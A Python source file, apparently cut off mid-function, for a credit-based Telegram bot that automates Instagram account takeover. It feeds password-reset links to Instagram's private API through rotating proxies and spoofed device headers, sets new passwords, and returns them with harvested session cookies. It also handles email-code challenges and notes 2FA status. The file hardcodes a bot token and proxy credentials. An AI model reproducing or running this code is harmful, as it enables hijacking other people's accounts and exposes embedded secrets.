
import random
from threading import Lock
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters
import string
import uuid
from datetime import datetime
import json
import logging
from telegram.ext import CommandHandler
import json
import asyncio
import concurrent.futures
import requests
import random
import string
from datetime import datetime
import uuid
import re
import html
from urllib.parse import urljoin, urlparse, parse_qs
import base64
import json
import os
import tempfile
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

GLOBAL_LIMIT = asyncio.Semaphore(300)
REQUEST_TIMEOUT = 15
MAX_RETRIES = 3

EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=300)
USER_DATA_LOCK = Lock()

RETRY_STRATEGY = Retry(
    total=3,
    backoff_factor=1,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["POST", "GET"],
)
HTTP_ADAPTER = HTTPAdapter(pool_connections=300, pool_maxsize=300, max_retries=RETRY_STRATEGY)

# ===== TELEGRAM INPUT =====
BOT_TOKEN = "8536378110:AAGFBPm3ByYcCNEt5CXjUkW24lWDAfUMRSs"
# ===== PROXY CONFIG =====
USERS_FILE = "users_privateIG.json"
ADMINS = {"6497729690"}   # ID của bạn

def load_users():
    print("Reading from:", USERS_FILE)

    if not os.path.exists(USERS_FILE):
        print("users.json not found, creating new one.")
        with open(USERS_FILE, "w") as f:
            json.dump({}, f)
        return {}

    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        print("Loaded users:", data)
        return data
    except Exception as e:
        print("JSON ERROR:", e)
        return {}
def save_users(data):
    users_dir = os.path.dirname(os.path.abspath(USERS_FILE)) or "."
    fd, temp_path = tempfile.mkstemp(prefix="users_", suffix=".json", dir=users_dir)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
        os.replace(temp_path, USERS_FILE)
    except Exception:
        try:
            os.unlink(temp_path)
        except OSError:
            pass
        raise

USER_DATA = load_users()

# ===== USAGE STATS =====
STATS_FILE = "stats_privateIG.json"
def load_stats():
    if not os.path.exists(STATS_FILE):
        return {}
    try:
        with open(STATS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_stats(data):
    with open(STATS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

USAGE_STATS = load_stats()
STATS_LOCK = Lock()

def track_usage(user_id_str):
    from datetime import datetime, timezone, timedelta
    vn_tz = timezone(timedelta(hours=7))
    today = datetime.now(vn_tz).strftime("%Y-%m-%d")
    with STATS_LOCK:
        if user_id_str not in USAGE_STATS:
            USAGE_STATS[user_id_str] = {"total": 0, "daily": {}}
        USAGE_STATS[user_id_str]["total"] += 1
        USAGE_STATS[user_id_str]["daily"][today] = USAGE_STATS[user_id_str]["daily"].get(today, 0) + 1
        save_stats(USAGE_STATS)
# proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@gw.dataimpulse.com:823"
PROXIES = [
	#lethihongloan12a14@gmail.com
     "http://Bw3K4LMw:4Mn8NRijFqG1LWO5@143.110.160.236:10070",
]
def get_proxy():
    proxy_url = random.choice(PROXIES)
    return {
        "http": proxy_url,
        "https": proxy_url
    }

def build_http_session(user_agent="", mid=""):
    session = requests.Session()
    session.mount("http://", HTTP_ADAPTER)
    session.mount("https://", HTTP_ADAPTER)
    session.proxies = get_proxy()
    session.headers.update(make_headers(mid=mid, user_agent=user_agent))
    return session

def get_user_snapshot():
    with USER_DATA_LOCK:
        return dict(USER_DATA)

def get_user_credits(user_id_str):
    with USER_DATA_LOCK:
        user = USER_DATA.get(user_id_str)
        if not user:
            return None
        return user.get("credits", 0)

def set_user_credits(user_id_str, amount):
    with USER_DATA_LOCK:
        USER_DATA.setdefault(user_id_str, {})
        USER_DATA[user_id_str]["credits"] = amount
        save_users(USER_DATA)

def add_user_if_missing(user_id_str, credits=0):
    with USER_DATA_LOCK:
        if user_id_str in USER_DATA:
            return False
        USER_DATA[user_id_str] = {"credits": credits}
        save_users(USER_DATA)
        return True

def remove_user_if_exists(user_id_str):
    with USER_DATA_LOCK:
        if user_id_str not in USER_DATA:
            return False
        del USER_DATA[user_id_str]
        save_users(USER_DATA)
        return True

def consume_credit(user_id_str):
    with USER_DATA_LOCK:
        user = USER_DATA.get(user_id_str)
        if not user:
            return None
        credits = user.get("credits", 0)
        if credits <= 0:
            return credits
        user["credits"] = credits - 1
        save_users(USER_DATA)
        return user["credits"]

def test_proxy():
    try:
        proxy = get_proxy()

        session = build_http_session()
        session.proxies = proxy

    except Exception as e:
        print("❌ Proxy error:", e)



async def send_telegram(update, text):
    await update.message.reply_text(text)


async def add_user(update, context):
    admin_id_str = str(update.effective_user.id)

    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    try:
        new_user = context.args[0]

        add_user_if_missing(new_user, credits=0)

        await update.message.reply_text(f"✅ Added user {new_user}")

    except:
        await update.message.reply_text("Usage: /adduser 123456789")

async def remove_user(update, context):
    admin_id_str = str(update.effective_user.id)

    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    try:
        user_remove = context.args[0]

        remove_user_if_exists(user_remove)

        await update.message.reply_text(f"❌ Removed user {user_remove}")

    except:
        await update.message.reply_text("Usage: /removeuser 123456789")

async def list_users(update, context):
    admin_id_str = str(update.effective_user.id)

    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    users_snapshot = get_user_snapshot()
    if not users_snapshot:
        await update.message.reply_text("📭 No users found.")
        return

    users_text = ""

    for user_id, data in users_snapshot.items():
        credits = data.get("credits", 0)
        users_text += f"ID: {user_id} | Credits: {credits}\n"

    MAX_LENGTH = 4024
    n = len(users_text)
    messages = [users_text[i:i + MAX_LENGTH] for i in range(0, n, MAX_LENGTH)]
    for msg in messages:
        await update.message.reply_text(msg)
    # await update.message.reply_text(f"📋 Users:\n\n{users_text}")

# SET credit
async def set_credit(update, context):
    admin_id_str = str(update.effective_user.id)

    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /setcredit user_id amount")
        return

    target_id = context.args[0]
    amount = int(context.args[1])

    set_user_credits(target_id, amount)

    await update.message.reply_text(
        f"✅ Set {amount} credits for {target_id}"
    )

# ADD credit (cộng thêm)
async def add_credit(update, context):
    admin_id_str = str(update.effective_user.id)

    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /addcredit user_id amount")
        return

    target_id = context.args[0]
    try:
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Amount phải là số nguyên.")
        return

    if amount <= 0:
        await update.message.reply_text("❌ Amount phải > 0.")
        return

    with USER_DATA_LOCK:
        if target_id not in USER_DATA:
            USER_DATA[target_id] = {"credits": 0}
        old_credits = USER_DATA[target_id]["credits"]
        USER_DATA[target_id]["credits"] = old_credits + amount
        new_credits = USER_DATA[target_id]["credits"]
        save_users(USER_DATA)

    await update.message.reply_text(
        f"✅ Added +{amount} credits for {target_id}\n"
        f"📊 {old_credits} → {new_credits}"
    )

# REMOVE credit (trừ bớt)
async def remove_credit(update, context):
    admin_id_str = str(update.effective_user.id)

    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /removecredit user_id amount")
        return

    target_id = context.args[0]
    try:
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Amount phải là số nguyên.")
        return

    if amount <= 0:
        await update.message.reply_text("❌ Amount phải > 0.")
        return

    with USER_DATA_LOCK:
        if target_id not in USER_DATA:
            await update.message.reply_text(f"❌ User {target_id} không tồn tại.")
            return
        old_credits = USER_DATA[target_id]["credits"]
        USER_DATA[target_id]["credits"] = max(0, old_credits - amount)
        new_credits = USER_DATA[target_id]["credits"]
        save_users(USER_DATA)

    await update.message.reply_text(
        f"✅ Removed -{amount} credits for {target_id}\n"
        f"📊 {old_credits} → {new_credits}"
    )

# TRANSFER credit (chuyển từ user này sang user khác)
async def transfer_credit(update, context):
    admin_id_str = str(update.effective_user.id)

    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    if len(context.args) < 3:
        await update.message.reply_text("Usage: /transfer from_id to_id amount")
        return

    from_id = context.args[0]
    to_id = context.args[1]
    try:
        amount = int(context.args[2])
    except ValueError:
        await update.message.reply_text("❌ Amount phải là số nguyên.")
        return

    if amount <= 0:
        await update.message.reply_text("❌ Amount phải > 0.")
        return

    if from_id == to_id:
        await update.message.reply_text("❌ Không thể chuyển cho chính mình.")
        return

    with USER_DATA_LOCK:
        if from_id not in USER_DATA:
            await update.message.reply_text(f"❌ User nguồn {from_id} không tồn tại.")
            return
        if to_id not in USER_DATA:
            await update.message.reply_text(f"❌ User đích {to_id} không tồn tại.")
            return
        from_old = USER_DATA[from_id]["credits"]
        if from_old < amount:
            await update.message.reply_text(
                f"❌ User {from_id} chỉ có {from_old} credits, không đủ {amount}."
            )
            return
        to_old = USER_DATA[to_id]["credits"]
        USER_DATA[from_id]["credits"] = from_old - amount
        USER_DATA[to_id]["credits"] = to_old + amount
        save_users(USER_DATA)

    await update.message.reply_text(
        f"✅ Chuyển {amount} credits\n"
        f"📤 {from_id}: {from_old} → {USER_DATA[from_id]['credits']}\n"
        f"📥 {to_id}: {to_old} → {USER_DATA[to_id]['credits']}"
    )

def generate_device_info():
    aid = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"

    ua = (
        f"Instagram 394.0.0.46.81 Android "
        f"({random.choice(['29/10', '30/11', '31/12'])}; "
        f"{random.choice(['320dpi', '480dpi'])}; "
        f"{random.choice(['720x1280', '1080x1920'])}; "
        f"{random.choice(['samsung', 'xiaomi', 'google'])}; "
        f"{random.choice(['SM-G975F', 'Mi-9T', 'Pixel-4'])}; "
        f"en_US; {random.randint(100000000, 999999999)})"
    )

    wf = str(uuid.uuid4())
    
    pw = gen_ecrypt_pass()
    # meta = get_encryption_data()
    # my_password = "luc123@!"
    # pw = encrypt_password(my_password, meta['public_key'], meta['key_id'], meta['version'])
    return aid, ua, wf, pw

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "0f5ba13b8c5c63effb68b7e785bb5ce2d3521b170e3a726be026f1a6fc368d13",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Accept-Language": "en-US,en;q=0.9",
    }

def gen_ecrypt_pass():
    p = f"Jackyan123{random.randint(10, 99)}@"
    ts = int(datetime.now().timestamp())
    return f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{p}"
def get_param(url, key):
    if f"{key}=" in url:
        return url.split(f"{key}=")[1].split("&")[0]
    return "null"
def extract_session(auth_header):
    # bỏ prefix
    token = auth_header.replace("Bearer IGT:2:", "")

    # decode base64
    decoded = base64.b64decode(token).decode()

    data = json.loads(decoded)

    sessionid = data.get("sessionid")
    ds_user_id = data.get("ds_user_id")
    return f'sessionid={sessionid}; ds_user_id= {ds_user_id}'
def request_change_pass(session: requests.Session, reset_link, device, pre_cookies=""):
    
    password = gen_ecrypt_pass()
    url = "https://www.instagram.com/api/v1/bloks/apps/com.instagram.account_security.password_reset_submit_action_handler/"

    uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
    token = reset_link.split("&token=")[1].split(":")[0]
    source = get_param(reset_link, "s")
    afv = get_param(reset_link, "afv")
    afv = "" if afv == "null" else afv
    is_caa = "False" if get_param(reset_link, "is_caa") == "null" else "True"
    data = {
        "error_state": '{"state_id":1783503903,"index":0,"type_name":"str"}',
        "enc_new_password1": password,
        "enc_new_password2": password,
        "uidb36": uidb36,
        "token": token,
        "source": source,
        "is_caa": is_caa,
        "afv": afv
    }

    response_r1 = None
    last_err = None
    for attempt in range(MAX_RETRIES):
        try:
            response_r1 = session.post(url, data=data, timeout=REQUEST_TIMEOUT)
            break
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            last_err = e
            print(f"[request_change_pass] Attempt {attempt+1}/{MAX_RETRIES} failed: {e}")
            # Rotate proxy on retry
            session.proxies = get_proxy()
            import time
            time.sleep(1)
    if response_r1 is None:
        raise last_err or Exception("All retries failed")
    c = session.cookies.get_dict()
    result = "; ".join(f"{k}={v}" for k, v in c.items()) + ";"
    text = response_r1.text.replace("\\","")
    authorization = response_r1.headers.get("Ig-Set-Authorization")
    if "password_reset_recovery_success_client" in text:
        if "two_factor" in text:
            pw = password.split(":")[-1]
            
            # Extract 2FA details
            last4_match = re.search(r"last_four_digits=(\d{4})", text)
            username_match = re.search(r"username=([a-zA-Z0-9_.]+)", text)
            is_totp = "totp_two_factor_on=True" in text or "totp_two_factor_on%3DTrue" in text
            is_sms = "sms_two_factor_on=True" in text or "sms_two_factor_on%3DTrue" in text
            
            last4 = last4_match.group(1) if last4_match else ""
            username = username_match.group(1) if username_match else ""
            fa_type = "TOTP" if is_totp else ("SMS" if is_sms else "Unknown")
            
            print(f"[2FA] username={username}, type={fa_type}, last4={last4}")
            
            # Verify: re-send same request to check if token was consumed
            try:
                verify_r = session.post(url, data=data, timeout=REQUEST_TIMEOUT)
                verify_text = verify_r.text.replace("\\", "")
                print(f"[2FA] Verify response (first 300): {verify_text[:300]}")
                
                if "Expired token" in verify_text or "status\":\"fail" in verify_text:
                    # Token consumed = password WAS changed
                    print(f"[2FA] Token consumed! Password was changed.")
                    s = f"🔑`{pw}` - 2FA ({fa_type})"
                    if last4:
                        s += f" - {last4}"
                    return {
                        "type": "success",
                        "password": pw,
                        "note_2fa": s
                    }
                else:
                    # Token still valid = password NOT changed
                    print(f"[2FA] Token still valid! Password was NOT changed.")
                    return {
                        "type": "failed",
                        "error": f"Account có 2FA ({fa_type}). Pass không đổi được."
                    }
            except Exception as e:
                print(f"[2FA] Verify error: {e}, assuming success")
                s = f"🔑`{pw}` - 2FA ({fa_type})"
                if last4:
                    s += f" - {last4}"
                return {
                    "type": "success",
                    "password": pw,
                    "note_2fa": s
                }
    
        if authorization != None:
            cookies = extract_session(authorization)
            pw = password.rsplit(":", 1)[1]
            result += cookies
            return {
                "type": "success",
                "password": pw,
                "cookies": result
            }

    if "Expired token" in text:
        return {
            "type": "failed",
            "error": "Expired token" 
        }
    if pre_cookies != "":
        print(["pre coookies"])
        result += pre_cookies
        return {
            "type": "success",
            "cookies": result
        }
    session.cookies.update({"mid": response_r1.headers.get("Ig-Set-X-Mid")})
    return {
        "type": "challenge",
        "response": response_r1 
    }

def verify_code(session: requests, context_data, device_id, referer, lsd, jazoest, code, reset_link, device):
    print("[VERIFY CODE]")
    inner = {
        "server_params": {
            "context_data": context_data,
            "device_id": device_id
        },
        "client_input_params": {
            "code": code,
            "machine_id": "",
            "auth_secure_device_id": "",
            "aac": "",
        }
    }

    params = json.dumps({
        "params": json.dumps(inner)
    })

    # request lên POST /async/wbloks/fetch/?appid=com.bloks.www.ap.two_step_verification.code_entry_async&type=action&__bkv=0f5ba13b8c5c63effb68b7e785bb5ce2d3521b170e3a726be026f1a6fc368d13 HTTP/2
    url_verify = "https://www.instagram.com/async/wbloks/fetch/"

    params_url = {
        "appid": "com.bloks.www.ap.two_step_verification.code_entry_async",
        "type": "action",
        "__bkv": "0f5ba13b8c5c63effb68b7e785bb5ce2d3521b170e3a726be026f1a6fc368d13"
    }

    data = {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": referer,
        "lsd": lsd,
        "jazoest": jazoest,
        "params": params,
        "__user": "0",
        "__a": "1",
        "__ccg": "EXCELLENT",
        "__d": "www"
    }
    response_r4 = session.post(url_verify, params=params_url, data=data, timeout=REQUEST_TIMEOUT)
    print(f"[VERIFY CODE] Status: {response_r4.status_code}")
    print(f"[VERIFY CODE] Response (first 500): {response_r4.text[:500]}")
    header_str = str(response_r4.headers)
    sessionid_match = re.search(r'sessionid=([^;]+)', header_str)
    ds_user_id_match = re.search(r'ds_user_id=([^;]+)', header_str)
    sessionid = sessionid_match.group(1) if sessionid_match else None
    ds_user_id = ds_user_id_match.group(1) if ds_user_id_match else None
    print(f"[VERIFY CODE] sessionid={sessionid is not None}, ds_user_id={ds_user_id is not None}")
    pre_cookies = f"sessionid={sessionid}; ds_user_id={ds_user_id}"
    if sessionid == None and ds_user_id == None:
        print(f"[VERIFY CODE] No session cookies from wbloks, trying v1...")
        res = reset_instagram_password_v1(reset_link=reset_link, device=device)
        if res["success"]:
            return {
                    "type": "success",
                    "password": res["password"],
            }
        else:
            return {
                "type": "failed",
                "error": "Code verify failed \u2014 wbloks kh\u00f4ng tr\u1ea3 cookie, v1 c\u0169ng fail."
            }
    return request_change_pass(session, reset_link, device=device, pre_cookies=pre_cookies)
    
    #         r4json = response_r4.json()
    #     except ValueError:
    #         r4json = {}
    #     print(r4json)
    #     challenge_context = r4json.get("challenge", {}).get("challenge_context")
    #     contextr4 = challenge_context if challenge_context != None else context_data
    #     return verify_code(
    #         session=session,
    #         context_data=contextr4,
    #         device_id=device_id,
    #         referer=referer,
    #         lsd=lsd,
    #         jazoest=jazoest,
    #         reset_link=reset_link,
    #         code=code,
    #         device=device
    #     )
        
    # else:
    #     # call change pass r1
    #     return request_change_pass(session, reset_link, device=device, pre_cookies=pre_cookies)


def get_context_data_from_reshtml(text):
    key = "context_data"
    pos = text.find(key)

    if pos == -1:
        return None

    # 1. tìm dấu "(" mở gần nhất phía trước
    start = text.rfind("(bk.action.array.Make", 0, pos)
    if start == -1:
        return None

    # 2. tìm đóng ngoặc của block đầu (dùng counter)
    i = start
    depth = 0
    while i < len(text):
        if text[i] == "(":
            depth += 1
        elif text[i] == ")":
            depth -= 1
            if depth == 0:
                end1 = i
                break
        i += 1

    block1 = text[start:end1+1]

    # 3. tìm block tiếp theo
    start2 = text.find("(bk.action.array.Make", end1)
    if start2 == -1:
        return None

    i = start2
    depth = 0
    while i < len(text):
        if text[i] == "(":
            depth += 1
        elif text[i] == ")":
            depth -= 1
            if depth == 0:
                end2 = i
                break
        i += 1

    block2 = text[start2:end2+1]

    text = block1 + ", " + block2
    blocks = re.findall(r'\(bk\.action\.array\.Make,(.*?)\)', text)

    keys_block = blocks[0]
    values_block = blocks[1]

    # 2. extract keys
    keys = re.findall(r'\\"([^\\"]+)\\"', keys_block)

    # 3. extract values (string + bool)
    values_raw = re.findall(r'\\"([^\\"]+)\\"|false|true', values_block)

    values = []
    for v in values_raw:
        if isinstance(v, tuple):
            v = v[0]
        values.append(v)

    # 4. map key-value
    data = dict(zip(keys, values))
    return data
    
def reset_instagram_password(reset_link, device, _retry=0):
    MAX_RETRIES = 2
    USER_AGENT = device["user_agent"]
    session = build_http_session(user_agent=USER_AGENT)
    request_result = request_change_pass(session, reset_link, device=device)
    if request_result.get("type") == "success":
        return {
            "success": True,
            "password": request_result.get("password"),
            "cookies": request_result.get("cookies"),
            "note_2fa": request_result.get("note_2fa"),
            }

    if request_result.get("type") == "failed":
        error_msg = request_result.get("error", "")
        # Retry on v1-specific failures (proxy lottery)
        if _retry < MAX_RETRIES and any(k in error_msg for k in ["UNKNOWN", "Token ch\u01b0a consumed", "format changed"]):
            print(f"[RETRY] v1 failed ({error_msg}), retrying with new proxy ({_retry+1}/{MAX_RETRIES})...")
            return reset_instagram_password(reset_link, device, _retry=_retry+1)
        return {
            "success": False,
            "error": request_result.get("error"),
            }
    text = request_result.get("response").text.replace("\\","")
    match = re.search(r'OpenUrlV2,\s*"([^"]+)"', text)
    if match:
        url = match.group(1)
        if "https://www.instagram.com" in url:
            url = url.split("https://www.instagram.com")[1]
        
        # If redirected to login page (not a challenge), retry with new proxy first
        if "/accounts/login" in url and "challenge" not in url:
            if _retry < MAX_RETRIES:
                print(f"[RETRY] Login redirect, retrying with new proxy ({_retry+1}/{MAX_RETRIES})...")
                return reset_instagram_password(reset_link, device, _retry=_retry+1)
            print(f"[FLOW] Redirected to login page after {MAX_RETRIES} retries. Falling back to v1")
            return reset_instagram_password_v1(reset_link=reset_link, device=device)
        
        if "challenge/action" in url:
            print("[challenge/action] - web GET for context_data + mobile API for email trigger")
            
            # Step A: Web GET → extract context_data, device_id, lsd, jazoest from HTML
            full_link_ca = "https://www.instagram.com" + url
            context_data_ca = None
            device_id_ca = None
            lsd_ca = ""
            jazoest_ca = ""
            
            try:
                print(f"[FLOW] Web GET challenge URL: {full_link_ca[:150]}")
                response_ca = session.get(full_link_ca, timeout=REQUEST_TIMEOUT)
                html_ca = response_ca.text.replace("\\", "")
                print(f"[FLOW] Web GET status: {response_ca.status_code}, length: {len(html_ca)}")
                
                # Check for meta redirect first
                match_ca = re.search(r'URL=([^"]+)', html_ca)
                if match_ca:
                    raw_ca = match_ca.group(1)
                    print(f"[FLOW] Web redirect: {raw_ca[:200]}")
                    if "codeentry" in raw_ca or "challengepicker" in raw_ca:
                        print(f"[FLOW] Web GET → codeentry/challengepicker! Using web flow directly.")
                        pass  # Fall through to the web GET flow below (line 856+)
                    else:
                        raise ValueError("Not codeentry redirect")
                else:
                    # No redirect → try to extract context_data from the SPA HTML
                    lsd_match = re.search(r'"token":"(.*?)"', html_ca)
                    jazoest_match = re.search(r'"initSprinkleValue":"(.*?)"', html_ca)
                    lsd_ca = lsd_match.group(1) if lsd_match else ""
                    jazoest_ca = jazoest_match.group(1) if jazoest_match else ""
                    print(f"[FLOW] lsd={lsd_ca[:20]}, jazoest={jazoest_ca[:20]}")
                    
                    # Debug: search for various data formats in the SPA HTML
                    raw_text = response_ca.text
                    has_context = "context_data" in raw_text
                    has_challenge_ctx = "challenge_context" in raw_text
                    has_nonce = "nonce_code" in raw_text
                    has_bk_action = "bk.action.array.Make" in raw_text
                    has_bloks_payload = "bloks_payload" in raw_text
                    print(f"[FLOW] SPA HTML analysis: context_data={has_context}, challenge_context={has_challenge_ctx}, nonce={has_nonce}, bk_action={has_bk_action}, bloks_payload={has_bloks_payload}")
                    
                    # Try standard extraction first
                    pre_data_ca = get_context_data_from_reshtml(raw_text)
                    if pre_data_ca:
                        context_data_ca = pre_data_ca.get("context_data")
                        device_id_ca = pre_data_ca.get("device_id")
                        print(f"[FLOW] Extracted from web: context_data={str(context_data_ca)[:80]}, device_id={device_id_ca}")
                    else:
                        print(f"[FLOW] get_context_data_from_reshtml returned None")
                        
                        # Try alternative extraction: look for challenge_context in JSON
                        ctx_match = re.search(r'"challenge_context"\s*:\s*"([^"]+)"', raw_text)
                        if ctx_match:
                            print(f"[FLOW] Found challenge_context in JSON: {ctx_match.group(1)[:80]}")
                        
                        # Try to find any context-like data
                        for pattern_name, pattern in [
                            ("server_params", r'"server_params"\s*:\s*(\{[^}]+\})'),
                            ("contextData", r'"contextData"\s*:\s*"([^"]+)"'),
                            ("context", r'"context"\s*:\s*"([^"]{20,})"'),
                        ]:
                            m = re.search(pattern, raw_text)
                            if m:
                                print(f"[FLOW] Found {pattern_name}: {m.group(1)[:100]}")
                    
                    raise ValueError("No redirect - use mobile API for email trigger")
                    
            except ValueError:
                # Step B: Mobile API → trigger email code
                challenge_path = url
                challenge_api_url = f"https://i.instagram.com/api/v1{challenge_path}"
                csrftoken = session.cookies.get('csrftoken', '')
                USER_AGENT = device["user_agent"]
                mobile_headers = make_headers(user_agent=USER_AGENT)
                mobile_headers['X-CSRFToken'] = csrftoken
                
                print(f"[FLOW] Trying mobile API to trigger email: {challenge_api_url[:150]}")
                try:
                    r_mobile = session.get(challenge_api_url, headers=mobile_headers, timeout=REQUEST_TIMEOUT)
                    print(f"[FLOW] Mobile GET status: {r_mobile.status_code}")
                    print(f"[FLOW] Mobile GET response (first 500): {r_mobile.text[:500]}")
                    
                    if r_mobile.status_code == 200:
                        try:
                            mobile_json = r_mobile.json()
                            step_name = mobile_json.get("step_name", "")
                            step_data = mobile_json.get("step_data", {})
                            print(f"[FLOW] step_name={step_name}")
                            
                            if step_name == "verify_email":
                                print("[FLOW] Already on verify_email, email was sent")
                            elif step_name == "select_verify_method":
                                has_email = "email" in str(step_data).lower()
                                if has_email:
                                    r_sel = session.post(challenge_api_url, headers=mobile_headers, data={"choice": "1"}, timeout=REQUEST_TIMEOUT)
                                    print(f"[FLOW] Select email (choice=1): {r_sel.status_code}, {r_sel.text[:300]}")
                                else:
                                    # No email → v1
                                    print(f"[FLOW] No email in challenge. V1 đổi pass...")
                                    res = reset_instagram_password_v1(reset_link=reset_link, device=device)
                                    if res.get("success"):
                                        return res
                                    return {"success": False, "error": "Challenge không có option email. V1 cũng fail."}
                            else:
                                print(f"[FLOW] Unknown step_name: {step_name}")
                        except ValueError:
                            print(f"[FLOW] Mobile response is not JSON")
                except Exception as e:
                    print(f"[FLOW] Mobile API error: {e}")
                
                # Step C: Return need_code with context_data if available (→ verify_code web)
                #         or with challenge_url if not (→ verify_challenge_code mobile)
                if context_data_ca:
                    print(f"[FLOW] Returning web context_data → will use verify_code (web cookies)")
                    session.headers.update({"Referer": full_link_ca})
                    return {
                        "success": False,
                        "need_code": True,
                        "data": {
                            "context_data": context_data_ca,
                            "device_id": device_id_ca,
                            "lsd": lsd_ca,
                            "jazoest": jazoest_ca,
                            "referer": full_link_ca,
                            "reset_link": reset_link,
                            "session": session,
                        }
                    }
                else:
                    print(f"[FLOW] No web context_data → falling back to mobile verify")
                    return {
                        "success": False,
                        "need_code": True,
                        "data": {
                            "challenge_url": challenge_api_url,
                            "csrftoken": csrftoken,
                            "lsd": "",
                            "jazoest": "",
                            "referer": "https://www.instagram.com" + url,
                            "reset_link": reset_link,
                            "session": session,
                            "context_data": None,
                            "device_id": None,
                        }
                    }
            except Exception as e:
                print(f"[FLOW] Web GET error: {e}")
                return {"success": False, "error": f"Challenge/action error: {e}"}
        
        full_link = "https://www.instagram.com" + url
        print(f"[FLOW] Following URL: {full_link}")
        response_r2 = session.get(full_link, timeout=REQUEST_TIMEOUT)
        html_txt_r2 = response_r2.text.replace("\\", "")
        print(f"[FLOW] R2 status: {response_r2.status_code}, length: {len(html_txt_r2)}")
        
        match = re.search(r'URL=([^"]+)', html_txt_r2)
        if match:        
        
            raw = match.group(1)
            print(f"[FLOW] Redirect raw URL: {raw[:200]}")
            if "afad" in raw or "no_challenge" in raw or "limbo" in raw:
                res = reset_instagram_password_v1(device=device, reset_link=reset_link)
                s = "Con này đã bị xào"
                if res.get("success"):
                    pw = res.get("password")
                    s += f"\n 🔑:`{pw}`"
                
                return {
                    "success": False,
                    "error": s,
                }

            decoded = html.unescape(html.unescape(raw))
            full_link_entry = urljoin("https://www.instagram.com", decoded)
            lsd_match = re.search(r'"token":"(.*?)"', html_txt_r2)
            jazoest_match = re.search(r'"initSprinkleValue":"(.*?)"', html_txt_r2)
            lsd = lsd_match.group(1) if lsd_match != None else ""
            jazoest = jazoest_match.group(1) if jazoest_match != None else ""

            print(f"[FLOW] Following entry URL: {full_link_entry[:200]}")
            response_r3 = session.get(full_link_entry, timeout=REQUEST_TIMEOUT)
            session.headers.update({"Referer": full_link_entry})
            print(f"[FLOW] R3 status: {response_r3.status_code}, length: {len(response_r3.text)}")
            
            pre_data_r3 = get_context_data_from_reshtml(response_r3.text)
            if pre_data_r3 is None:
                print("[FLOW] get_context_data_from_reshtml returned None")
                print(f"[FLOW] R3 text (first 1000): {response_r3.text[:1000]}")
                if _retry < MAX_RETRIES:
                    print(f"[RETRY] context_data parse failed, retrying ({_retry+1}/{MAX_RETRIES})...")
                    return reset_instagram_password(reset_link, device, _retry=_retry+1)
                return reset_instagram_password_v1(reset_link=reset_link, device=device)
            
            context_data = pre_data_r3.get("context_data")
            
            if context_data == None:
                print("[FLOW] context_data is None, falling back")
                if _retry < MAX_RETRIES:
                    print(f"[RETRY] context_data=None, retrying ({_retry+1}/{MAX_RETRIES})...")
                    return reset_instagram_password(reset_link, device, _retry=_retry+1)
                return reset_instagram_password_v1(reset_link=reset_link, device=device)
                
            device_id = pre_data_r3.get("device_id")
            print(f"[FLOW] Got context_data={context_data[:50]}..., device_id={device_id}")
                
            if "codeentry" in raw:
                # await 
                if "Check your email" not in response_r3.text:
                    res = reset_instagram_password_v1(device=device, reset_link=reset_link)
                    s = "WhatsApp, SMS"
                    if res.get("success"):
                        pw = res.get("password")
                        s += f"\n🔑`{pw}`\nLưu ý: Login bằng ip khác có thể ra xác minh email, nếu không hãy ngâm vài tiếng sau rồi login lại sẽ ra xác minh email"
                        return {
                            "success": True,
                            "note": s
                        }
                    return {
                        "success": False,
                        "error": s
                    }
                return {
                    "success": False,
                    "need_code": True,
                    "data": {
                        "context_data": context_data,
                        "device_id": device_id,
                        "lsd": lsd,
                        "jazoest": jazoest,
                        "referer": full_link_entry,
                        "reset_link": reset_link,
                        "session": session       
                    }
                }
            if "challengepicker" in raw:
                print("[challengepicker] - trying v1 directly")
                res = reset_instagram_password_v1(reset_link=reset_link, device=device)
                if res.get("success"):
                    pw = res.get("password")
                    return {
                        "success": True,
                        "password": pw,
                        "note": "⚠️ Challengepicker\n🔑`" + pw + "`\n(acc đang bị checkpoint)"
                    }
                return {
                    "success": False,
                    "error": "Tài khoản đang bị challengepicker (khả năng bị xào)"
                }
            
            # If we have context_data but URL is not codeentry/challengepicker,
            # still try to return need_code if it looks like a code entry page
            if "Check your email" in response_r3.text or "Enter" in response_r3.text:
                print("[FLOW] Detected code entry page from challenge/action flow")
                return {
                    "success": False,
                    "need_code": True,
                    "data": {
                        "context_data": context_data,
                        "device_id": device_id,
                        "lsd": lsd,
                        "jazoest": jazoest,
                        "referer": full_link_entry,
                        "reset_link": reset_link,
                        "session": session       
                    }
                }
            
            print(f"[FLOW] Unknown challenge type in URL: {raw[:200]}")
            if _retry < MAX_RETRIES:
